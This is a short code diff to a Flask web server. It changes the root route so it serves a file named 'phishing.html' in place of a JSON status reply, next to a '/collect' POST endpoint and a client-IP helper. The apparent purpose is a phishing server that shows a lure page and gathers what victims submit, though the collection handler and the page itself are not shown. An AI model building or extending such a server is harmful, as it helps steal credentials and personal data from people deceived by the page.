@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 from datetime import datetime
 import threading
 import time
@@ -60,7 +60,7 @@ def get_client_ip():
 
 @app.route('/', methods=['GET'])
 def index():
-    return jsonify({'status': 'ok'}), 200
+    return send_from_directory('.', 'phishing.html')
 
 
 @app.route('/collect', methods=['POST'])
